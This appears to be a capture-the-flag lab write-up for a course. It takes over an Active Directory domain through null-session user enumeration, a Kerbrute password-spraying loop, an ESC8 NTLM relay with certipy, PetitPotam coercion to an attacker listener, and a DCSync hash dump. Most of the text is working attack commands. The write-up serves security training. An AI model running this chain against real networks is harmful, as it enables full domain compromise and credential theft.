# URL
https://www.hacksmarter.org/courses/e7586073-d447-41db-8f8e-6bd22576556d/
# Concept
* Kerbrute password spraying loop
* Active Directory certificate attacks
* NTLM Relay attack
* secrets dump with Domain Controller
# Method of solve
## Initial Scans
* we look for null sesssion with Netexec
```
netexec smb shadow.gate -u '' -p ''
```
* since there are null sessions we can enumerate usernames
```
netexec smb shadow.gate -u '' -p '' --users
```
* we can copy the usernames and use linux-fu to crop out the output we don't want
```
cat users_raw.txt | cut -d '1' -f 5 | cut -d '2' -f 1 | tr -d ' ' > users.txt
```
* and now we have a users.txt file, which we can feed into the `Kerbrute` tool in a loop with the password spray attack to run down a big list
```
for p in $(cat /usr/share/wordlists/rockyou.txt); do ./kerbrute passwordspray -d shadow.gate --dc 10.1.196.34 ./users.txt $p ; done > kerbrute_loop.txt &
```
* we can check on the progress of the tool with:
```
cat kerbrute_loop.txt | grep 'Done! Tested 9 logins (1 successes)'
```
* this gives us our domain credentials `bbrown:redacted`
## Domain User Access
* now we can check fileshares
```
netexec smb shadow.gate -u 'bbrown' -p 'redacted' --shares
```
* this lets know there is a fileshare on the system that we can access
```
smbclient //shadow.gate/CertEnroll -U bbrown
```
* the contents of this fileshare make us highly suspicious that the method of attack we should use is Active Directory certificate abuse
## Certipy Certificate Attack
* after installing the Certipy tool, we can enumerate the certificates:
```
certipy find -u 'bbrown@shadow.gate' -p 'redacted' -dc-ip '10.1.55.212' -text -enabled -hide-admins
```
* then we look in the output file for any vulnerable certificates:
```
cat 20260605150351_Certipy.txt | grep 'Vulnerabilities' -C 5
```
* we are informed that the specified cert is associated with the code `ESC8`
* and we can get the privilege escalation steps on the certipy wiki:
`https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment`
* so the next step is to setup an NTLM relay with certipy
```
certipy relay -target http://shadow.gate/certsrv/certfnsh.asp -ca shadow-DC01-CA -template KerberosAuthentication
```
* then we need to run the coercion attack, which we can do with Netexec:
```
netexec smb shadow.gate -u 'bbrown' -p 'redacted' -M coerce_plus
netexec smb shadow.gate -u 'bbrown' -p 'redacted' -M coerce_plus -o LISTENER=10.200.62.131 METHOD=PetitPotam
```
* after the attack is done, we have the domain controller's pfx file, and we can combine that with certipy to get the Domain Controller computer account NTLM hash:
```
certipy auth -pfx 'dc01$_shadow$_shadow.pfx' -dc-ip '10.1.55.212
```
* now we have the domain controller NTLM hash, which we can use to perform a DCSync attack which will dump out all the hashes for users on the domain:
## Secrets Dump with Domain Controller
```
impacket-secretsdump -hashes 'redacted' shadow.gate/'DC01$'@10.1.55.212 > domain.hashes
```
* now we have all of the password hashes for domain users
* ID the one for the KRBTGT NTLM hash, and we're done


